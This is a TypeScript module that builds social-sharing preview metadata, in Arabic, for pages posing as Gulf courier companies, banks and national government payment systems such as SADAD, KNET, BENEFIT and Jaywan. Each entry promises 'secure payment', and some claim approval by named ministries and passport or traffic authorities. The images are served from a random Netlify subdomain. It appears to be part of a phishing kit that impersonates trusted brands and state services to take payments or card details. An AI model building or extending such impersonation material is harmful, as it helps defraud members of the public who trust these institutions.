/**
 * Enhanced Company Metadata Mapping
 * Maps each company to their specific OG meta tags for social sharing
 * تحديث ديناميكي للصورة والعنوان والوصف حسب الشركة
 */

export interface CompanyMeta {
  image: string;
  title: string;
  description: string;
}

const companyMetaMap: Record<string, CompanyMeta> = {
  // UAE - الإمارات
  aramex: {
    image: "/og-aramex.jpg",
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
  },
  dhl: {
    image: "/og-dhl.jpg",
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
  },
  fedex: {
    image: "/og-fedex.jpg",
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
  },
  ups: {
    image: "/og-ups.jpg",
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
  },
  empost: {
    image: "/og-empost.jpg",
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨"
  },

  // Saudi Arabia - السعودية
  smsa: {
    image: "/og-smsa.jpg",
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
  },
  zajil: {
    image: "/og-zajil.jpg",
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦"
  },
  naqel: {
    image: "/og-naqel.jpg",
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
  },
  saudipost: {
    image: "/og-saudipost.jpg",
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦"
  },

  // Kuwait - الكويت
  kwpost: {
    image: "/og-kwpost.jpg",
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅"
  },

  // Qatar - قطر
  qpost: {
    image: "/og-qpost.jpg",
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍"
  },

  // Oman - عمان
  omanpost: {
    image: "/og-omanpost.jpg",
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮"
  },

  // Bahrain - البحرين
  bahpost: {
    image: "/og-bahpost.jpg",
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨"
  },

  // Additional Companies
  jinakum: {
    image: "/og-jinakum.jpg",
    title: "دفع آمن - جينا كم للشحن 📦",
    description: "جينا كم - حلول شحن مبتكرة في الخليج - أكمل الدفع بأمان للحصول على خدمات لوجستية متطورة وتوصيل سريع 🚚"
  },
  jinaken: {
    image: "/og-jinaken.jpg",
    title: "دفع آمن - جيناكوم للشحن 🚛",
    description: "جيناكوم - خدمات شحن عُمانية متميزة - ادفع بأمان واستفد من شبكة توزيع واسعة وخدمات توصيل موثوقة في عُمان 🇴🇲"
  },
  genacom: {
    image: "/og-genacom.jpg",
    title: "دفع آمن - جيناكوم للشحن 📮",
    description: "جيناكوم - شحن سريع وآمن - أكمل دفعتك بأمان للحصول على خدمات لوجستية احترافية مع تتبع فوري للشحنات 📍"
  },
  albaraka: {
    image: "/og-albaraka.jpg",
    title: "دفع آمن - البركة للشحن 🌟",
    description: "البركة للشحن - خدمات لوجستية متكاملة في الخليج - ادفع بأمان واحصل على حلول شحن احترافية وموثوقة ✅"
  },
  alfuttaim: {
    image: "/og-alfuttaim.jpg",
    title: "دفع آمن - الفطيم للخدمات اللوجستية 🏢",
    description: "مجموعة الفطيم - حلول لوجستية عالمية - أكمل الدفع بأمان للحصول على خدمات شحن وتوزيع احترافية في المنطقة 🌐"
  },
  alshaya: {
    image: "/og-alshaya.jpg",
    title: "دفع آمن - الشايع للخدمات اللوجستية 📦",
    description: "مجموعة الشايع - شبكة توزيع واسعة - ادفع بأمان واستفد من خدمات شحن احترافية وحلول لوجستية متطورة 🚚"
  },
  shipco: {
    image: "/og-shipco.jpg",
    title: "دفع آمن - شيبكو للشحن الدولي 🚢",
    description: "شيبكو - شحن بحري وجوي وبري - أكمل دفعتك بأمان للحصول على خدمات نقل دولية شاملة مع حلول لوجستية متكاملة 🌍"
  },
  bahri: {
    image: "/og-bahri.jpg",
    title: "دفع آمن - بحري للنقل البحري ⚓",
    description: "بحري السعودية - رائدة النقل البحري - ادفع بأمان واحصل على خدمات شحن بحرية احترافية وحلول لوجستية متطورة 🚢"
  },
  hellmann: {
    image: "/og-hellmann.jpg",
    title: "دفع آمن - هيلمان العالمية 🌐",
    description: "هيلمان - خدمات لوجستية عالمية - أكمل الدفع بأمان للحصول على حلول شحن دولية احترافية مع تغطية عالمية شاملة ✈️"
  },
  dsv: {
    image: "/og-dsv.jpg",
    title: "دفع آمن - DSV اللوجستية العالمية 📦",
    description: "DSV - شبكة لوجستية عالمية - ادفع بأمان واستفد من حلول نقل وشحن دولية متكاملة مع خدمات احترافية 🌍"
  },
  agility: {
    image: "/og-agility-temp.jpg",
    title: "دفع آمن - أجيليتي للخدمات اللوجستية 🚚",
    description: "أجيليتي - حلول سلسلة التوريد - أكمل دفعتك بأمان للحصول على خدمات لوجستية متكاملة في الخليج والعالم 🌐"
  },

  // Government Services - خدمات الدفع الحكومية
  // Saudi Arabia - SADAD
  sadad: {
    image: "/og-government_payment.jpg",
    title: "سداد - نظام المدفوعات الوطني السعودي 🇸🇦",
    description: "سداد SADAD | دفع رسوم جواز السفر، المخالفات المرورية، رخصة القيادة، الخدمات البلدية، العقود، بطاقة الأحوال، الخدمات التعليمية والصحية، تصاريح العمل، التأمين، استمارة المركبة، الجمارك وفواتير الخدمات | نظام آمن معتمد 🔒"
  },
  'sadad-passport': {
    image: "/og-government_payment.jpg",
    title: "سداد - دفع رسوم جواز السفر 🇸🇦",
    description: "تجديد وإصدار جوازات السفر عبر نظام سداد الإلكتروني - دفع آمن ومعتمد من الجوازات السعودية ✅"
  },
  'sadad-traffic-violations': {
    image: "/og-government_payment.jpg",
    title: "سداد - دفع المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر سداد - نظام آمن معتمد من إدارة المرور السعودية 🔒"
  },
  'sadad-driving-license': {
    image: "/og-government_payment.jpg",
    title: "سداد - رخصة القيادة 🪪",
    description: "إصدار وتجديد رخص القيادة عبر سداد - خدمة إلكترونية معتمدة من المرور السعودي ✅"
  },
  'sadad-municipal': {
    image: "/og-government_payment.jpg",
    title: "سداد - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر سداد - نظام آمن للرخص البلدية والتصاريح 🔒"
  },
  'sadad-contracts': {
    image: "/og-government_payment.jpg",
    title: "سداد - توثيق العقود 📄",
    description: "دفع رسوم توثيق العقود عبر سداد - خدمة معتمدة من وزارة العدل السعودية ✅"
  },
  'sadad-id-card': {
    image: "/og-government_payment.jpg",
    title: "سداد - بطاقة الأحوال المدنية 🪪",
    description: "إصدار وتجديد بطاقة الأحوال المدنية عبر سداد - نظام إلكتروني آمن ومعتمد 🔒"
  },
  'sadad-education': {
    image: "/og-government_payment.jpg",
    title: "سداد - الخدمات التعليمية 📚",
    description: "دفع الرسوم الدراسية والخدمات التعليمية عبر سداد - معتمد من وزارة التعليم ✅"
  },
  'sadad-health': {
    image: "/og-government_payment.jpg",
    title: "سداد - الخدمات الصحية 🏥",
    description: "دفع رسوم المستشفيات والخدمات الصحية عبر سداد - نظام آمن معتمد من وزارة الصحة 🔒"
  },
  'sadad-work-permit': {
    image: "/og-government_payment.jpg",
    title: "سداد - تصاريح العمل والإقامة 💼",
    description: "دفع رسوم تصاريح العمل والإقامة عبر سداد - خدمة معتمدة من الجوازات والعمل ✅"
  },
  'sadad-insurance': {
    image: "/og-government_payment.jpg",
    title: "سداد - التأمين 🛡️",
    description: "دفع أقساط التأمين الطبي والسيارات عبر سداد - نظام دفع إلكتروني آمن 🔒"
  },
  'sadad-vehicle-registration': {
    image: "/og-government_payment.jpg",
    title: "سداد - استمارة المركبة 🚗",
    description: "تجديد استمارة المركبة عبر سداد - خدمة معتمدة من إدارة المرور السعودية ✅"
  },
  'sadad-customs': {
    image: "/og-government_payment.jpg",
    title: "سداد - الجمارك 📦",
    description: "دفع الرسوم الجمركية عبر سداد - نظام إلكتروني معتمد من هيئة الجمارك السعودية 🔒"
  },
  'sadad-utilities': {
    image: "/og-government_payment.jpg",
    title: "سداد - فواتير الخدمات 💡",
    description: "دفع فواتير الكهرباء والماء والاتصالات عبر سداد - نظام دفع إلكتروني شامل ✅"
  },

  // Bahrain - BENEFIT
  benefit: {
    image: "/og-government_payment.jpg",
    title: "بنفت - الشبكة الإلكترونية البحرينية 🇧🇭",
    description: "بنفت BENEFIT | دفع رسوم جواز السفر، المخالفات المرورية، بطاقة CPR، الخدمات البلدية وجميع الخدمات الحكومية | شبكة المدفوعات الوطنية الموثوقة 💳"
  },
  'benefit-passport': {
    image: "/og-government_payment.jpg",
    title: "بنفت - دفع رسوم جواز السفر 🇧🇭",
    description: "تجديد وإصدار جوازات السفر عبر شبكة بنفت - نظام دفع آمن معتمد من الجوازات البحرينية ✅"
  },
  'benefit-traffic': {
    image: "/og-government_payment.jpg",
    title: "بنفت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر بنفت - شبكة دفع إلكترونية معتمدة من المرور البحريني 🔒"
  },
  'benefit-cpr': {
    image: "/og-government_payment.jpg",
    title: "بنفت - بطاقة CPR البحرينية 🪪",
    description: "إصدار وتجديد البطاقة الشخصية CPR عبر بنفت - خدمة معتمدة من هيئة المعلومات والحكومة الإلكترونية ✅"
  },
  'benefit-municipal': {
    image: "/og-government_payment.jpg",
    title: "بنفت - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر بنفت - نظام إلكتروني آمن ومعتمد 🔒"
  },

  // Kuwait - KNET
  knet: {
    image: "/og-government_payment.jpg",
    title: "كي نت - شبكة الكويت الوطنية 🇰🇼",
    description: "كي نت KNET | دفع رسوم جواز السفر، البطاقة المدنية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية | نظام الدفع الإلكتروني الرائد ✅"
  },
  'knet-passport': {
    image: "/og-government_payment.jpg",
    title: "كي نت - دفع رسوم جواز السفر 🇰🇼",
    description: "تجديد وإصدار جوازات السفر عبر كي نت - نظام دفع آمن معتمد من إدارة الجوازات الكويتية ✅"
  },
  'knet-paci': {
    image: "/og-government_payment.jpg",
    title: "كي نت - البطاقة المدنية PACI 🪪",
    description: "رسوم البطاقة المدنية عبر كي نت - خدمة معتمدة من الهيئة العامة للمعلومات المدنية 🔒"
  },
  'knet-traffic': {
    image: "/og-government_payment.jpg",
    title: "كي نت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر كي نت - نظام إلكتروني معتمد من إدارة المرور الكويتية ✅"
  },
  'knet-municipal': {
    image: "/og-government_payment.jpg",
    title: "كي نت - الخدمات البلدية 🏛️",
    description: "دفع رسوم البلدية عبر كي نت - شبكة دفع آمنة ومعتمدة 🔒"
  },

  // Oman - OmanNet/Maal
  omannet: {
    image: "/og-government_payment.jpg",
    title: "عُمان نت - بطاقة مال 🇴🇲",
    description: "عُمان نت OmanNet - بطاقة مال | دفع رسوم جواز السفر، بطاقة الهوية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية | شبكة الدفع الإلكتروني الوطنية 💳"
  },
  'omannet-passport': {
    image: "/og-government_payment.jpg",
    title: "عُمان نت - دفع رسوم جواز السفر 🇴🇲",
    description: "تجديد وإصدار جوازات السفر عبر عُمان نت - نظام دفع آمن معتمد من شرطة عُمان السلطانية ✅"
  },
  'omannet-id': {
    image: "/og-government_payment.jpg",
    title: "عُمان نت - بطاقة الهوية 🪪",
    description: "إصدار وتجديد بطاقة الهوية عبر عُمان نت - خدمة معتمدة من الأحوال المدنية العُمانية 🔒"
  },
  'omannet-traffic': {
    image: "/og-government_payment.jpg",
    title: "عُمان نت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر عُمان نت - نظام إلكتروني معتمد من شرطة عُمان السلطانية ✅"
  },
  'omannet-municipal': {
    image: "/og-government_payment.jpg",
    title: "عُمان نت - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر عُمان نت - شبكة دفع آمنة ومعتمدة 🔒"
  },

  // UAE - Jaywan
  jaywan: {
    image: "/og-government_payment.jpg",
    title: "جيوان - نظام الدفع الإماراتي 🇦🇪",
    description: "جيوان Jaywan | دفع رسوم جواز السفر، الهوية الإماراتية، المخالفات المرورية، الخدمات البلدية، خدمات الإقامة وجميع الخدمات الحكومية | نظام الدفع الإلكتروني الوطني 🏛️"
  },
  'jaywan-passport': {
    image: "/og-government_payment.jpg",
    title: "جيوان - دفع رسوم جواز السفر 🇦🇪",
    description: "تجديد وإصدار جوازات السفر عبر جيوان - نظام دفع آمن معتمد من الهيئة الاتحادية للهوية والجنسية ✅"
  },
  'jaywan-emirates-id': {
    image: "/og-government_payment.jpg",
    title: "جيوان - الهوية الإماراتية 🪪",
    description: "إصدار وتجديد الهوية الإماراتية عبر جيوان - خدمة معتمدة من الهيئة الاتحادية للهوية والجنسية 🔒"
  },
  'jaywan-traffic': {
    image: "/og-government_payment.jpg",
    title: "جيوان - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر جيوان - نظام إلكتروني معتمد من وزارة الداخلية الإماراتية ✅"
  },
  'jaywan-municipal': {
    image: "/og-government_payment.jpg",
    title: "جيوان - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر جيوان - شبكة دفع آمنة ومعتمدة 🔒"
  },
  'jaywan-visa': {
    image: "/og-government_payment.jpg",
    title: "جيوان - خدمات الإقامة والتأشيرات 🛂",
    description: "رسوم الإقامة والتأشيرات عبر جيوان - نظام آمن معتمد من الهيئة الاتحادية للهوية والجنسية ✅"
  },

  // Qatar - Government Payment
  'qatar-gov': {
    image: "/og-government_payment.jpg",
    title: "بوابة الدفع الحكومي القطرية 🇶🇦",
    description: "بوابة الدفع الحكومي | دفع رسوم جواز السفر، بطاقة الهوية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية في قطر | نظام الدفع الإلكتروني الرسمي 🏛️"
  },
  'qatar-passport': {
    image: "/og-government_payment.jpg",
    title: "بوابة الدفع القطرية - جواز السفر 🇶🇦",
    description: "تجديد وإصدار جوازات السفر عبر بوابة الدفع القطرية - نظام آمن معتمد من وزارة الداخلية ✅"
  },
  'qatar-id': {
    image: "/og-government_payment.jpg",
    title: "بوابة الدفع القطرية - بطاقة الهوية 🪪",
    description: "إصدار وتجديد بطاقة الهوية عبر بوابة الدفع القطرية - خدمة معتمدة من وزارة الداخلية 🔒"
  },
  'qatar-traffic': {
    image: "/og-government_payment.jpg",
    title: "بوابة الدفع القطرية - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر بوابة الدفع القطرية - نظام إلكتروني معتمد من إدارة المرور ✅"
  },
  'qatar-municipal': {
    image: "/og-government_payment.jpg",
    title: "بوابة الدفع القطرية - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر بوابة الدفع القطرية - نظام آمن ومعتمد 🔒"
  },

  // Service Categories
  government_payment: {
    image: "/og-government_payment.jpg",
    title: "الدفع الحكومي - خدمات إلكترونية متكاملة 🏛️",
    description: "منصة موحدة لدفع جميع الخدمات الحكومية | جواز السفر، البطاقات الشخصية، المخالفات المرورية، الخدمات البلدية والمزيد | نظام دفع آمن ومعتمد 🔒✅"
  },
  chalets: {
    image: "/og-chalets.jpg",
    title: "حجز الشاليهات والاستراحات 🏖️",
    description: "حجز شاليهات واستراحات فاخرة في دول الخليج - دفع آمن عبر الإنترنت مع ضمان الحجز الفوري ✅"
  },
  contracts: {
    image: "/og-contracts.jpg",
    title: "توثيق العقود الإلكترونية 📄",
    description: "خدمة توثيق العقود الإلكترونية - دفع آمن معتمد لتوثيق جميع أنواع العقود والاتفاقيات 🔒"
  },
  invoices: {
    image: "/og-invoices.jpg",
    title: "الفواتير الإلكترونية 🧾",
    description: "إنشاء وإدارة الفواتير الإلكترونية - نظام متكامل لإصدار واستلام وتتبع الفواتير 💼"
  },
  health_links: {
    image: "/og-health_links.jpg",
    title: "الخدمات الصحية الإلكترونية 🏥",
    description: "دفع رسوم الخدمات الصحية والمستشفيات - نظام آمن للمواعيد الطبية والفواتير الصحية 💊"
  },
  local_payment: {
    image: "/og-local_payment.jpg",
    title: "المدفوعات المحلية 💳",
    description: "نظام الدفع المحلي الآمن - تحويلات ومدفوعات محلية سريعة وموثوقة لجميع الخدمات 🔒"
  },
  bank_pages: {
    image: "/og-bank_pages.jpg",
    title: "الخدمات البنكية الإلكترونية 🏦",
    description: "منصة شاملة للخدمات البنكية - حوالات، مدفوعات، وإدارة حساباتك بكل أمان وسهولة 💰"
  },

  // Default fallback
  default: {
    image: "/og-aramex.jpg",
    title: "دفع آمن - منصة الدفع الموحدة 💳",
    description: "نظام دفع إلكتروني آمن ومحمي بتشفير SSL - أكمل معاملاتك المالية بكل ثقة وأمان مع حماية كاملة لبياناتك 🔒✅"
  }
};

/**
 * Get absolute URL for image
 */
function getAbsoluteImageUrl(imagePath: string): string {
  if (imagePath.startsWith('http')) {
    return imagePath;
  }
  
  const productionDomain = typeof window !== 'undefined'
    ? window.location.origin
    : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');
  
  return `${productionDomain}${imagePath}`;
}

/**
 * Get company metadata with fallback and absolute URLs
 * @param companyKey - Company identifier (e.g., 'dhl', 'aramex')
 * @returns Company metadata object with absolute image URL
 */
export const getCompanyMeta = (companyKey: string): CompanyMeta => {
  if (!companyKey) {
    const defaultMeta = companyMetaMap.default;
    return {
      ...defaultMeta,
      image: getAbsoluteImageUrl(defaultMeta.image)
    };
  }

  const key = companyKey.toLowerCase();
  const meta = companyMetaMap[key] || companyMetaMap.default;
  
  return {
    ...meta,
    image: getAbsoluteImageUrl(meta.image)
  };
};
